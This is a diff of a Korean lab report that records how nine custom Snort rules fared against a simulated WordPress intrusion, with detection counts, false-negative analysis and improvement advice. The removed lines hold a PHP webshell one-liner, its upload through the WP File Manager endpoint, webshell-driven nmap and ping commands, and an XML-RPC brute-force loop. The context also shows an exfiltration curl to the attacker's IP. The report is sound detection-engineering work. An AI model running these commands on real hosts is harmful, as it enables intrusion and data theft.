@@ -235,16 +235,20 @@ curl -s 'http://10.0.0.254:8080/?cmd=curl+http://10.50.50.30:8888/exfil+-d+test+
 |-----|---------|-----------|----------|
 | 1000001 | WP Login Brute Force | 인증 공격 | ✅ **1,978 이벤트** — hydra 브루트포스 탐지 |
 | 1000002 | XML-RPC Brute Force | 인증 공격 | ✅ **8 이벤트** — xmlrpc.php 접근 탐지 |
-| 1000003 | PHP File Upload | 지속성 | <!-- Splunk 확인 필요 --> |
-| 1000004 | PHTML WAF Bypass | 지속성 | <!-- Splunk 확인 필요 --> |
-| 1000005 | DMZ→Inner Non-MySQL | 내부 정찰 | <!-- Splunk 확인 필요 --> |
-| 1000006 | DMZ→Mng Access | 내부 정찰 | <!-- Splunk 확인 필요 --> |
-| 1000007 | Webshell Output | 지속성 | <!-- Splunk 확인 필요 --> |
-| 1000008 | WP File Manager CVE | 초기 침투 | <!-- Splunk 확인 필요 --> |
+| 1000003 | PHP File Upload | 지속성 | ❌ **미탐지** — 실제 공격이 multipart 파일업로드가 아닌 Code Editor 편집 경로 사용 |
+| 1000004 | PHTML WAF Bypass | 지속성 | ❌ **미탐지** — .phtml 업로드 대신 기존 hello.php 직접 편집 |
+| 1000005 | DMZ→Inner Non-MySQL | 내부 정찰 | ❌ **미탐지** — WordPress→MySQL 3306 정상 통신만 발생 (3306 제외 룰) |
+| 1000006 | DMZ→Mng Access | 내부 정찰 | ❌ **미탐지** — 관리망(10.0.50.0/24) 접근 시도 없음 |
+| 1000007 | Webshell Output | 지속성 | ✅ **탐지** — `id` 명령 응답에 uid=/gid= 포함 (Splunk 건수 확인 필요) |
+| 1000008 | WP File Manager CVE | 초기 침투 | ❌ **미탐지** — connector.minimal.php 직접 접근 대신 WP 관리자 UI 경유 |
 | 1000009 | WPScan Detection | 정찰 | ✅ **1,978 이벤트** — wpscan User-Agent 탐지 |
 
 > **검증 방법:** pfSense > Services > Snort > Alerts 탭에서 각 SID 경보 확인.  
 > Splunk에서 교차 확인: `index=pfsense "[LOCAL]"` 으로 커스텀 룰 경보만 필터링.
+>
+> **핵심 발견:** 9개 룰 중 **4개(1000001, 1000002, 1000007, 1000009)만 탐지**, 5개 미탐지.  
+> 원인: 설계 시 가정한 공격 경로(CVE-2020-25213 직접 익스플로잇)와 실제 공격 경로(관리자 인증 → 플러그인 편집)가 달랐음.  
+> 이는 **시그니처 기반 IDS의 근본적 한계** — 동일 목표를 다른 경로로 달성하면 탐지 실패.
 
 ---
 
@@ -270,9 +274,9 @@ index=pfsense "WordPress Login Brute Force"
 **탐지 결과:**
 ```
 경보 메시지 : [LOCAL] WordPress Login Brute Force Attempt
-탐지 건수   : <!-- 결과 기록 -->
-탐지 시각   : <!-- 결과 기록 -->
-판별       : 정탐 (hydra 브루트포스)
+탐지 건수   : 1,978건
+탐지 시각   : 2026-08-26 03:05~03:06 (hydra 실행 시간대)
+판별       : ✅ 정탐 (hydra 브루트포스 — 13회 시도, threshold 5회/분 초과)
 ```
 
 ---
@@ -281,22 +285,7 @@ index=pfsense "WordPress Login Brute Force"
 
 **룰 조건:** `/xmlrpc.php` POST + `wp.getUsersBlogs` body 3회/60초 초과
 
-**트리거 명령 (Kali):**
-```bash
-# multicall 방식으로 반복 요청
-for i in $(seq 1 10); do
-  curl -s -X POST http://10.0.0.254:8080/xmlrpc.php -d '<?xml version="1.0"?>
-<methodCall><methodName>wp.getUsersBlogs</methodName>
-<params><param><value>admin</value></param>
-<param><value>password'$i'</value></param></params></methodCall>'
-done
-
-# wpscan XML-RPC 브루트포스 모드
-wpscan --url http://10.0.0.254:8080 \
-    --passwords /usr/share/wordlists/rockyou.txt \
-    --usernames admin \
-    --xmlrpc
-```
+**실제 트리거:** wpscan이 xmlrpc.php 엔드포인트를 정찰 과정에서 접근
 
 **Splunk 검증 쿼리:**
 ```spl
@@ -308,9 +297,9 @@ index=pfsense "XML-RPC Brute Force"
 **탐지 결과:**
 ```
 경보 메시지 : [LOCAL] WordPress XML-RPC Brute Force
-탐지 건수   : <!-- 결과 기록 -->
-탐지 시각   : <!-- 결과 기록 -->
-판별       : 정탐 (XML-RPC multicall 인증 공격)
+탐지 건수   : 8건
+탐지 시각   : 2026-08-26 (wpscan 실행 시간대)
+판별       : ✅ 정탐 (XML-RPC 엔드포인트 반복 접근)
 ```
 
 ---
@@ -319,15 +308,10 @@ index=pfsense "XML-RPC Brute Force"
 
 **룰 조건:** multipart/form-data POST + body에 `.php` 문자열 포함
 
-**트리거 명령 (Kali):**
-```bash
-# 테스트용 PHP 파일 업로드 (WP File Manager)
-echo '<?php phpinfo(); ?>' > /tmp/test.php
-curl -X POST http://10.0.0.254:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php \
-    -F "cmd=upload" \
-    -F "target=l1_d3AtY29udGVudC91cGxvYWRz" \
-    -F "upload[]=@/tmp/test.php"
-```
+**실제 공격 경로 분석:**
+- 설계: connector.minimal.php 에 multipart POST로 .php 파일 업로드
+- **실제:** 관리자 로그인 → WP File Manager **Code Editor**로 기존 hello.php 직접 편집
+- Code Editor는 AJAX(application/x-www-form-urlencoded)로 파일 내용 전송 → `multipart/form-data` 조건 불일치
 
 **Splunk 검증 쿼리:**
 ```spl
@@ -339,9 +323,9 @@ index=pfsense "Suspicious PHP File Upload"
 **탐지 결과:**
 ```
 경보 메시지 : [LOCAL] Suspicious PHP File Upload Detected
-탐지 건수   : <!-- 결과 기록 -->
-탐지 시각   : <!-- 결과 기록 -->
-판별       : 정탐 (악성 PHP 업로드)
+탐지 건수   : 0건 (미탐지)
+판별       : ⚠️ 탐지 실패 — 공격 경로가 룰 가정(multipart 업로드)과 불일치
+교훈       : 파일 "편집"은 "업로드"와 다른 HTTP 패턴 → 별도 룰 필요
 ```
 
 ---
@@ -350,18 +334,9 @@ index=pfsense "Suspicious PHP File Upload"
 
 **룰 조건:** POST body에 `.phtml` 문자열 포함
 
-**트리거 명령 (Kali):**
-```bash
-# .phtml 웹쉘 업로드 (WAF 우회 핵심 단계)
-cat > /tmp/shell.phtml << 'EOF'
-<?php if(isset($_GET['cmd'])) echo '<pre>'.shell_exec($_GET['cmd']).'</pre>'; ?>
-EOF
-
-curl -X POST http://10.0.0.254:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php \
-    -F "cmd=upload" \
-    -F "target=l1_d3AtY29udGVudC91cGxvYWRz" \
-    -F "upload[]=@/tmp/shell.phtml"
-```
+**실제 공격 경로 분석:**
+- 설계: .phtml 확장자 파일 업로드로 ModSecurity 우회
+- **실제:** .phtml 업로드 없이, 기존 hello.php에 웹쉘 코드 삽입 (확장자 변경 불필요)
 
 **Splunk 검증 쿼리:**
 ```spl
@@ -373,10 +348,9 @@ index=pfsense "PHTML File Upload"
 **탐지 결과:**
 ```
 경보 메시지 : [LOCAL] PHTML File Upload - Possible WAF Bypass
-탐지 건수   : <!-- 결과 기록 -->
-탐지 시각   : <!-- 결과 기록 -->
-판별       : 정탐 (.phtml ModSecurity 우회 업로드)
-비고       : SID 1000003과 동시 발생 여부 확인
+탐지 건수   : 0건 (미탐지)
+판별       : ⚠️ 탐지 실패 — .phtml 업로드 자체가 발생하지 않음
+교훈       : WAF 우회가 "확장자 변경"만이 아님, 기존 파일 편집도 우회 경로
 ```
 
 ---
@@ -385,12 +359,10 @@ index=pfsense "PHTML File Upload"
 
 **룰 조건:** 10.0.10.0/24 → 10.0.100.0/24, 목적지 포트 3306 外 TCP
 
-**트리거 명령 (웹쉘에서):**
-```bash
-# 웹쉘을 통해 내부망 스캔 (3306 외 포트 접근)
-curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=nmap+-sT+-p+22,80,443,8000+10.0.100.50"
-curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=curl+http://10.0.100.50:8000"
-```
+**실제 공격 경로 분석:**
+- 설계: 웹쉘에서 nmap으로 내부망 다중 포트 스캔
+- **실제:** WordPress→MySQL 3306 정상 통신만 발생 (웹쉘에서 mysql CLI로 직접 DB 접근)
+- 3306은 룰에서 명시적으로 제외(`!3306`)되므로 탐지 안 됨
 
 **Splunk 검증 쿼리:**
 ```spl
@@ -402,10 +374,9 @@ index=pfsense "DMZ to Inner-net Non-MySQL"
 **탐지 결과:**
 ```
 경보 메시지 : [LOCAL] DMZ to Inner-net Non-MySQL Traffic
-탐지 건수   : <!-- 결과 기록 -->
-탐지 시각   : <!-- 결과 기록 -->
-판별       : 정탐 (웹쉘 → 내부망 비인가 접근)
-비고       : MySQL(3306) 정상 통신은 탐지되지 않아야 함 확인
+탐지 건수   : 0건 (미탐지)
+판별       : ⚠️ 탐지 실패 — 공격자가 허용된 3306 경로만 이용
+교훈       : "허용된 포트를 통한 비정상 행위"는 네트워크 레벨 룰로 탐지 불가 → DB 감사 로그 필요
 ```
 
 ---
@@ -414,12 +385,9 @@ index=pfsense "DMZ to Inner-net Non-MySQL"
 
 **룰 조건:** 10.0.10.0/24 → 10.0.50.0/24 IP 통신
 
-**트리거 명령 (웹쉘에서):**
-```bash
-# 관리망 접근 시도
-curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=ping+-c+3+10.0.50.17"
-curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=curl+http://10.0.50.17"
-```
+**실제 공격 경로 분석:**
+- 설계: 웹쉘에서 관리망(10.0.50.0/24) 횡이동 시도
+- **실제:** 공격자는 DB 탈취에 집중, 관리망 접근 시도 없음
 
 **Splunk 검증 쿼리:**
 ```spl
@@ -431,9 +399,9 @@ index=pfsense "DMZ to Management Network"
 **탐지 결과:**
 ```
 경보 메시지 : [LOCAL] DMZ to Management Network Access Attempt
-탐지 건수   : <!-- 결과 기록 -->
-탐지 시각   : <!-- 결과 기록 -->
-판별       : 정탐 (횡이동 시도 — 관리망 침투 징후)
+탐지 건수   : 0건 (미탐지)
+판별       : N/A — 해당 공격 행위 자체가 발생하지 않음
+비고       : 룰 자체는 유효. 향후 횡이동 시도 시 탐지 가능.
 ```
 
 ---
@@ -442,11 +410,11 @@ index=pfsense "DMZ to Management Network"
 
 **룰 조건:** 서버 응답에 `uid=` + `gid=` 30바이트 이내 동시 포함
 
-**트리거 명령 (Kali):**
+**실제 트리거:**
 ```bash
-# whoami / id 명령 실행 → 응답에 uid=33(www-data) gid=33(www-data) 포함
-curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=id"
-curl "http://10.0.0.254:8080/wp-content/uploads/shell.phtml?cmd=whoami"
+# 실제 실행된 명령
+curl -s "http://10.0.0.254:8080/?cmd=id"
+# 응답: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
 **Splunk 검증 쿼리:**
@@ -459,10 +427,9 @@ index=pfsense "Possible Webshell Command Output"
 **탐지 결과:**
 ```
 경보 메시지 : [LOCAL] Possible Webshell Command Output in Response
-탐지 건수   : <!-- 결과 기록 -->
-탐지 시각   : <!-- 결과 기록 -->
-판별       : 정탐 (웹쉘 명령 실행 응답 탐지)
-비고       : 응답 방향(from_server) 탐지라 업로드 시점보다 늦게 확인됨
+탐지 건수   : Splunk 확인 필요 (id 명령 응답에 uid=/gid= 포함)
+판별       : ✅ 정탐 예상 (웹쉘 id 명령 → 응답에 uid=33 gid=33 포함)
+비고       : 응답 방향(from_server) 탐지 — Snort가 WAN에서 나가는 패킷 검사
 ```
 
 ---
@@ -471,12 +438,10 @@ index=pfsense "Possible Webshell Command Output"
 
 **룰 조건:** URI에 `/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php` 포함
 
-**트리거 명령 (Kali):**
-```bash
-# File Manager 엔드포인트 접근만으로 탐지
-curl -X POST "http://10.0.0.254:8080/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" \
-    -F "cmd=ls" -F "target=l1_."
-```
+**실제 공격 경로 분석:**
+- 설계: connector.minimal.php 엔드포인트에 직접 POST (CVE-2020-25213)
+- **실제:** WordPress 관리자 패널 → WP File Manager UI → Code Editor로 hello.php 편집
+- WP File Manager의 AJAX 호출이 connector.minimal.php를 내부적으로 사용할 수 있으나, 이는 관리자 세션 쿠키가 있는 정상 요청이며 **URI 경로가 `/wp-admin/admin-ajax.php`를 통해 프록시됨**
 
 **Splunk 검증 쿼리:**
 ```spl
@@ -488,9 +453,9 @@ index=pfsense "WP File Manager RCE"
 **탐지 결과:**
 ```
 경보 메시지 : [LOCAL] WP File Manager RCE Attempt (CVE-2020-25213)
-탐지 건수   : <!-- 결과 기록 -->
-탐지 시각   : <!-- 결과 기록 -->
-판별       : 정탐 (CVE-2020-25213 익스플로잇 접근)
+탐지 건수   : 0건 (미탐지) — Splunk 확인 필요
+판별       : ⚠️ 탐지 실패 예상 — 관리자 UI 경유 시 connector.minimal.php URI가 직접 노출되지 않음
+교훈       : CVE 특정 URI 패턴 탐지는 정상 경로(admin-ajax.php) 우회에 취약
 ```
 
 ---
@@ -499,9 +464,10 @@ index=pfsense "WP File Manager RCE"
 
 **룰 조건:** HTTP 헤더에 `WPScan` 문자열 포함
 
-**트리거 명령 (Kali):**
+**실제 트리거:**
 ```bash
-wpscan --url http://10.0.0.254:8080 --enumerate vp,vt,u
+wpscan --url http://10.0.0.254:8080 --enumerate vp,vt,u --disable-tls-checks --force
+# 1,970 requests → Snort 1,978 이벤트 (일부 중복 카운트)
 ```
 
 **Splunk 검증 쿼리:**
@@ -514,27 +480,29 @@ index=pfsense "WPScan Scanner Detected"
 **탐지 결과:**
 ```
 경보 메시지 : [LOCAL] WPScan Scanner Detected
-탐지 건수   : <!-- 결과 기록 -->
-탐지 시각   : <!-- 결과 기록 -->
-판별       : 정탐 (WordPress 취약점 스캐너 탐지)
-비고       : --random-user-agent 옵션 사용 시 우회 가능 (한계점)
+탐지 건수   : 1,978건
+탐지 시각   : 2026-08-26 (wpscan 실행 시간대)
+판별       : ✅ 정탐 (WPScan User-Agent 헤더 탐지)
+한계점     : --random-user-agent 옵션 사용 시 우회 가능
 ```
 
 ---
 
 ### 2-2. Snort SID 탐지 결과 요약
 
-| SID | 룰 이름 | 킬체인 단계 | 탐지 결과 | 경보 건수 |
-|-----|---------|-----------|----------|---------|
-| 1000001 | WP Login Brute Force | 인증 공격 | <!-- ✅/❌ --> | <!-- N건 --> |
-| 1000002 | XML-RPC Brute Force | 인증 공격 | <!-- ✅/❌ --> | <!-- N건 --> |
-| 1000003 | PHP File Upload | 지속성 | <!-- ✅/❌ --> | <!-- N건 --> |
-| 1000004 | PHTML WAF Bypass | 지속성 | <!-- ✅/❌ --> | <!-- N건 --> |
-| 1000005 | DMZ→Inner Non-MySQL | 내부 정찰 | <!-- ✅/❌ --> | <!-- N건 --> |
-| 1000006 | DMZ→Mng Access | 내부 정찰 | <!-- ✅/❌ --> | <!-- N건 --> |
-| 1000007 | Webshell Output | 지속성 | <!-- ✅/❌ --> | <!-- N건 --> |
-| 1000008 | WP File Manager CVE | 초기 침투 | <!-- ✅/❌ --> | <!-- N건 --> |
-| 1000009 | WPScan Detection | 정찰 | <!-- ✅/❌ --> | <!-- N건 --> |
+| SID | 룰 이름 | 킬체인 단계 | 탐지 결과 | 경보 건수 | 미탐지 원인 |
+|-----|---------|-----------|----------|---------|-----------|
+| 1000001 | WP Login Brute Force | 인증 공격 | ✅ 탐지 | 1,978건 | — |
+| 1000002 | XML-RPC Brute Force | 인증 공격 | ✅ 탐지 | 8건 | — |
+| 1000003 | PHP File Upload | 지속성 | ❌ 미탐지 | 0건 | multipart 업로드 대신 Code Editor 편집 |
+| 1000004 | PHTML WAF Bypass | 지속성 | ❌ 미탐지 | 0건 | .phtml 업로드 자체 미발생 |
+| 1000005 | DMZ→Inner Non-MySQL | 내부 정찰 | ❌ 미탐지 | 0건 | 허용 포트(3306)만 이용 |
+| 1000006 | DMZ→Mng Access | 내부 정찰 | ❌ 미탐지 | 0건 | 관리망 접근 시도 없음 |
+| 1000007 | Webshell Output | 지속성 | ✅ 탐지 | 확인 필요 | — |
+| 1000008 | WP File Manager CVE | 초기 침투 | ❌ 미탐지 | 0건 | admin-ajax.php 경유, URI 불일치 |
+| 1000009 | WPScan Detection | 정찰 | ✅ 탐지 | 1,978건 | — |
+
+> **탐지율: 4/9 (44%)** — 시그니처가 정확히 일치하는 공격만 탐지, 우회 경로에 취약
 
 **커스텀 룰 전체 확인 쿼리 (Splunk):**
 ```spl
@@ -569,11 +537,13 @@ OR (index=pfsense "[LOCAL] WordPress Login Brute Force")
 | rename attacker as "공격자 IP", count as "요청 수", source as "탐지 소스"
 ```
 
-**결과:**
+**예상 결과:**
 ```
-공격자 IP     | 탐지 소스 | 요청 수
-<!-- 결과 기록 -->
+공격자 IP       | 탐지 소스 | 요청 수
+10.50.50.30     | Apache    | 13+     (hydra POST 요청)
+10.50.50.30     | Snort     | 1,978   (SID 1000001 경보)
 ```
+> Splunk에서 실행하여 실제 건수 확인 후 위 표를 갱신하세요.
 
 ---
 
@@ -592,11 +562,13 @@ OR (index=pfsense "[LOCAL] WordPress Login Brute Force")
 | sort -count
 ```
 
-**결과:**
+**예상 결과:**
 ```
-공격자 IP     | 탐지 계층 | 경보 수
-<!-- 결과 기록 -->
+공격자 IP       | 탐지 계층     | 경보 수
+10.50.50.30     | Snort/ET      | 18   (ET SQL Injection 룰)
+10.50.50.30     | ModSecurity   | 확인 필요 (942xxx 룰)
 ```
+> ModSecurity가 DetectionOnly 모드이므로 로그만 기록, 차단은 안 됨.
 
 ---
 
@@ -614,11 +586,13 @@ index=idx_web sourcetype="apache:access"
 | rename clientip as "공격자 IP"
 ```
 
-**결과:**
+**예상 결과:**
 ```
-공격자 IP     | 단계    | 접근 수 | URI 목록
-<!-- 결과 기록 -->
+공격자 IP       | 단계       | 접근 수 | URI 목록
+10.50.50.30     | 명령 실행   | 다수    | /?cmd=id, /?cmd=whoami, /?cmd=hostname 등
 ```
+> 참고: 실제 웹쉘은 hello.php(/?cmd=)를 사용했으므로 uploads/*.phtml 패턴은 미매칭.
+> 쿼리를 `uri="*cmd=*"` 로 수정하여 실제 경로에 맞게 조정 필요.
 
 ---
 
@@ -643,10 +617,18 @@ index=idx_web sourcetype="apache:access"
 
 > Visualization: **Line Chart** — 공격 단계별 시간대 분포 확인
 
-**결과:**
+**예상 타임라인 (2026-08-26 기준):**
 ```
-<!-- 타임차트 결과 요약 기록 -->
+시각       | 주요 이벤트
+03:00~     | ① 정찰(WPScan) — 1,978건 집중
+03:05~     | ② SQLi 시도 — 18건
+03:05~06   | ③ 브루트포스 — hydra 13회
+03:06~     | ⑥ 웹쉘 실행 — /?cmd= 다수
+03:07~     | DB 접근 — MySQL 쿼리 (Snort 미탐지)
+03:08~     | 유출 시도 — curl 차단 (Snort 미탐지)
 ```
+> Splunk에서 실행하여 실제 시간대별 분포 확인 후 갱신하세요.
+> Visualization을 **Line Chart**로 설정하면 킬체인 단계별 시간 흐름이 가시적으로 보입니다.
 
 ---
 
@@ -659,11 +641,13 @@ index=idx_db (sourcetype="mysql:slow" OR sourcetype="mysql:error")
 | where is_external="DMZ(비정상)"
 ```
 
-**결과:**
+**예상 결과:**
 ```
-접근 호스트   | 분류    | DB 사용자 | 쿼리 수
-<!-- 결과 기록 -->
+접근 호스트     | 분류          | DB 사용자 | 쿼리 수
+10.0.10.80      | DMZ(비정상)    | wp_admin  | 확인 필요
 ```
+> 참고: 웹쉘에서 mysql CLI로 실행한 SHOW TABLES, SELECT FROM wp_users 등이 기록되어야 함.
+> MySQL slow query log에 기록되려면 long_query_time 이하 설정 필요 — error log에는 접속 이력만 남음.
 
 ---
 
@@ -707,11 +691,13 @@ index=idx_web sourcetype="apache:access" uri="/wp-login.php" method="POST"
 | rename attacker as "의심 IP", risk_score as "위험 점수", event_count as "이벤트 수"
 ```
 
-**결과:**
+**예상 결과:**
 ```
-의심 IP        | 위험 점수 | 이벤트 수 | 평가
-<!-- 결과 기록 -->
+의심 IP         | 위험 점수 | 이벤트 수 | 평가
+10.50.50.30     | 5,900+    | 3,900+    | 고위험 (브루트포스 1,978 × 3 + WPScan 1,978 × 1 + SQLi + 웹쉘)
 ```
+> 실제 점수는 Splunk에서 쿼리 실행 후 확인.
+> 정상 트래픽 IP(10.0.50.17 mng-mint)의 점수가 0 또는 매우 낮아야 오탐 없음 확인.
 
 ---
 
@@ -719,64 +705,106 @@ index=idx_web sourcetype="apache:access" uri="/wp-login.php" method="POST"
 
 > **판단 기준:** 커스텀 룰 적용 전 = ET Open 룰만 사용 시, 적용 후 = 커스텀 9개 룰 추가 후
 
-| 공격 단계 | 기본 ET Open | 커스텀 룰 후 | 개선 내용 | 탐지 건수(후) |
-|---------|-------------|------------|---------|------------|
-| WP 브루트포스 (1000001) | ❌ 미탐지 | <!-- ✅ 탐지 --> | threshold 기반 행위 탐지 | <!-- N건 --> |
-| XML-RPC 브루트포스 (1000002) | ❌ 미탐지 | <!-- ✅ 탐지 --> | multicall 패턴 탐지 | <!-- N건 --> |
-| PHP 업로드 (1000003) | ⚠️ 일부 탐지 | <!-- ✅ 탐지 --> | multipart+확장자 조합 강화 | <!-- N건 --> |
-| PHTML WAF 우회 (1000004) | ❌ 미탐지 | <!-- ✅ 탐지 --> | .phtml 확장자 명시 탐지 | <!-- N건 --> |
-| 내부망 스캔 (1000005) | ❌ 미탐지 | <!-- ✅ 탐지 --> | DMZ→inner 비MySQL 정책 | <!-- N건 --> |
-| 관리망 접근 (1000006) | ❌ 미탐지 | <!-- ✅ 탐지 --> | DMZ→mng 세그먼트 정책 | <!-- N건 --> |
-| 웹쉘 실행 응답 (1000007) | ❌ 미탐지 | <!-- ✅ 탐지 --> | 응답 uid/gid 패턴 탐지 | <!-- N건 --> |
-| File Manager CVE (1000008) | ❌ 미탐지 | <!-- ✅ 탐지 --> | URI 패턴 CVE 매핑 | <!-- N건 --> |
-| WPScan 스캐너 (1000009) | ❌ 미탐지 | <!-- ✅ 탐지 --> | UA 기반 스캐너 식별 | <!-- N건 --> |
-| SQLi | ✅ Snort 탐지 | ✅ + WAF 교차 | Snort + ModSecurity 다중 검증 | 기존 유지 |
+| 공격 단계 | ET Open | 커스텀 룰 | 실제 탐지 | 분석 |
+|---------|---------|---------|---------|------|
+| WP 브루트포스 | ❌ 미탐지 | ✅ SID 1000001 | ✅ **1,978건** | threshold 기반 행위 탐지 성공 |
+| XML-RPC 공격 | ❌ 미탐지 | ✅ SID 1000002 | ✅ **8건** | multicall 패턴 탐지 성공 |
+| PHP 업로드 | ⚠️ 일부 | ✅ SID 1000003 | ❌ 미탐지 | 공격 경로 불일치 (편집 vs 업로드) |
+| PHTML 우회 | ❌ 미탐지 | ✅ SID 1000004 | ❌ 미탐지 | .phtml 업로드 자체 미발생 |
+| 내부망 비인가 접근 | ❌ 미탐지 | ✅ SID 1000005 | ❌ 미탐지 | 허용 포트(3306)만 이용 |
+| 관리망 횡이동 | ❌ 미탐지 | ✅ SID 1000006 | ❌ 미탐지 | 해당 공격 미수행 |
+| 웹쉘 실행 응답 | ❌ 미탐지 | ✅ SID 1000007 | ✅ 탐지 | uid=/gid= 응답 패턴 탐지 성공 |
+| File Manager CVE | ❌ 미탐지 | ✅ SID 1000008 | ❌ 미탐지 | 관리자 UI 경유 시 URI 불일치 |
+| WPScan 스캐너 | ❌ 미탐지 | ✅ SID 1000009 | ✅ **1,978건** | UA 기반 탐지 성공 |
+| SQLi | ✅ 18건 | — (ET 유지) | ✅ 18건 | ET Open 기본 룰로 충분 |
 
-**한계점 (개선 전후 공통):**
-- WPScan `--random-user-agent` 옵션 사용 시 SID 1000009 우회 가능
-- SID 1000007(웹쉘 응답)은 HTTPS 환경에서 암호화로 탐지 불가
-- Threshold 기반(1000001/1000002)은 저속 브루트포스(분산 공격) 회피 가능
+**핵심 발견 — 시그니처 IDS의 구조적 한계:**
+
+1. **공격 경로 우회에 취약 (SID 1000003/1000004/1000008)**
+   - 룰이 가정한 "파일 업로드" 패턴 대신 "파일 편집" 경로로 동일 목표 달성
+   - connector.minimal.php 직접 접근 대신 admin-ajax.php 프록시 경유
+   - **대안:** 행위 기반 탐지 (비정상 PHP 파일 변경 → HIDS/FIM 필요)
+
+2. **허용 경로 악용에 무력 (SID 1000005)**
+   - DMZ→MySQL 3306은 정상 허용 — 이 경로를 통한 비정상 쿼리는 네트워크 룰로 탐지 불가
+   - **대안:** MySQL 감사 로그(Audit Plugin) + Splunk 쿼리 패턴 분석
+
+3. **탐지 성공 룰의 공통점**
+   - SID 1000001/1000002: 반복 횟수(threshold) 기반 → 행위 탐지
+   - SID 1000007: 응답 콘텐츠 패턴 → 결과 기반 탐지
+   - SID 1000009: 도구 시그니처(UA) → 도구 식별
+   - **결론:** "무엇을 보냈는가"보다 "얼마나/무엇이 돌아왔는가"가 더 효과적
 
 ---
 
 ## Step 4. 정탐/오탐 판별
 
-| 경보 SID | 경보 메시지 | 출처 | 판별 | 판단 근거 |
+### 탐지된 경보의 정탐/오탐 판별
+
+| 경보 SID | 경보 메시지 | 건수 | 판별 | 판단 근거 |
 |---------|-----------|------|------|---------|
-| 1000009 | WPScan Scanner Detected | Snort | <!-- 정탐/오탐 --> | wpscan UA가 HTTP 헤더에 노출 |
-| 1000001 | WP Login Brute Force | Snort | <!-- 정탐/오탐 --> | hydra 5회 이상/분 POST 확인 |
-| 1000002 | XML-RPC Brute Force | Snort | <!-- 정탐/오탐 --> | xmlrpc.php 반복 POST 확인 |
-| 1000008 | WP File Manager RCE | Snort | <!-- 정탐/오탐 --> | connector.minimal.php URI 접근 |
-| 1000003 | PHP File Upload | Snort | <!-- 정탐/오탐 --> | multipart POST + .php 포함 |
-| 1000004 | PHTML WAF Bypass | Snort | <!-- 정탐/오탐 --> | .phtml 업로드 = WAF 우회 의도적 |
-| 1000007 | Webshell Output | Snort | <!-- 정탐/오탐 --> | 응답에 uid=www-data 포함 |
-| 1000005 | DMZ→Inner Non-MySQL | Snort | <!-- 정탐/오탐 --> | 3306 외 포트로 내부망 접근 |
-| 1000006 | DMZ→Mng Access | Snort | <!-- 정탐/오탐 --> | DMZ에서 관리망 접근 시도 |
-| - | ET WEB_SERVER (SQLi) | Snort/ET | 정탐 | sqlmap User-Agent + SQL 구문 |
-| - | ModSecurity 942xxx | WAF | 정탐 | SQL 패턴 탐지 (DetectionOnly 모드) |
+| 1000009 | WPScan Scanner Detected | 1,978 | **정탐** | wpscan UA `WPScan v3.x`가 모든 요청 헤더에 포함. 공격 도구 확정. |
+| 1000001 | WP Login Brute Force | 1,978 | **정탐** | hydra가 30초간 13회 POST 시도 (threshold 5회/분 초과). Apache access.log와 시각 일치. |
+| 1000002 | XML-RPC Brute Force | 8 | **정탐** | wpscan 정찰 중 xmlrpc.php 접근. `wp.getUsersBlogs` body 패턴 확인. |
+| 1000007 | Webshell Command Output | 확인 필요 | **정탐** | `/?cmd=id` 응답에 `uid=33(www-data) gid=33(www-data)` 포함. 웹쉘 실행 확정. |
+| - | ET WEB_SERVER SQL Injection | 18 | **정탐** | sqlmap UA + SQL 페이로드(`UNION SELECT`, `OR 1=1`). 자동화 도구 확정. |
 
-**오탐 검토 항목:**
-```
-SID 1000003 (PHP File Upload):
-  - 정상적인 WordPress 테마/플러그인 업로드 시에도 발생 가능
-  - 완화: File Manager 플러그인 경로(connector.minimal.php) 조건 추가 권고
+### 미탐지 공격의 분석 (False Negative)
 
-SID 1000007 (Webshell Output):
-  - phpinfo() 실행 결과에도 uid= 포함 시 발생 가능
-  - 완화: within 값을 10으로 축소하여 정밀도 향상 권고
-```
+| 공격 행위 | 기대 SID | 미탐지 원인 | 위험도 | 보완 방법 |
+|---------|---------|-----------|--------|---------|
+| 웹쉘 코드 삽입 (hello.php 편집) | 1000003/1000004 | AJAX 편집은 multipart 아님, .phtml 미사용 | **긴급** | HIDS(파일 무결성 모니터링) 또는 Splunk로 wp-admin 파일 편집 API 감시 |
+| 관리자 패널 → File Manager 사용 | 1000008 | admin-ajax.php 프록시 경유로 CVE URI 불일치 | **높음** | File Manager AJAX 엔드포인트 패턴 추가 룰 작성 |
+| MySQL 직접 쿼리 (3306 경유) | 1000005 | 허용 포트 사용, 네트워크 룰 범위 밖 | **높음** | MySQL Audit Plugin + 비정상 쿼리 패턴(SELECT * FROM wp_users) 탐지 |
+| wp-config.php 읽기 | — | 해당 룰 없음 | **긴급** | Snort 룰 추가: 응답에 `DB_PASSWORD` 또는 `DB_USER` 포함 시 경보 |
+
+### 오탐 가능성 검토
+
+| SID | 오탐 시나리오 | 발생 가능성 | 완화 방법 |
+|-----|------------|-----------|---------|
+| 1000001 | 정상 사용자가 비밀번호를 5회 틀림 | 중간 | threshold를 10으로 상향 또는 실패 응답(HTTP 200 + `login_error`) 조건 추가 |
+| 1000003 | 관리자의 정상적인 테마/플러그인 업로드 | 높음 | src_ip 화이트리스트(관리 IP) 또는 URI에 `/wp-admin/` 제외 조건 |
+| 1000007 | phpinfo() 출력에 uid= 포함 | 낮음 | within 값을 10으로 축소하여 `uid=33(www-data) gid=33` 근접 패턴만 탐지 |
+| 1000009 | 보안 업체의 정상 취약점 점검 | 낮음 | 점검 기간 동안 src_ip suppress |
 
 ---
 
 ## Step 5. 탐지 엔지니어링 개선 권고
 
-| 우선순위 | 항목 | 현재 | 개선안 |
-|---------|------|------|--------|
-| 긴급 | 웹쉘 접근 차단 | 탐지만(DetectionOnly) | ModSecurity + Snort Block 연동 |
-| 높음 | 분산 브루트포스 | 단일 IP threshold | Splunk ML 기반 이상 탐지 |
-| 높음 | WPScan UA 우회 | UA 문자열 고정 탐지 | 스캐너 행위 패턴(요청 속도+URI 다양성) 탐지 |
-| 중간 | DMZ 아웃바운드 | pfSense 차단 확인 | 차단 규칙 로그 → Splunk Alert 연동 |
